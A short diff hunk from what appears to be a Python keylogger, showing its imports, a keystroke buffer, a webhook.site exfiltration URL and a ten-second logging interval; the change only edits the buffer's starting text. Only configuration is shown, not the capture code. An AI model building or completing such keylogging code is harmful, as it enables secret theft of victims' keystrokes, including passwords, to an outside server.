@@ -2,7 +2,7 @@ import keyboard
 import requests
 import threading
 
-logged_keystrokes = ""
+logged_keystrokes = "Connection Established"
 webhookUrl = "https://webhook.site/5eb26f68-3adb-457a-9706-adf63da9b55c"
 logging_interval = 10
 
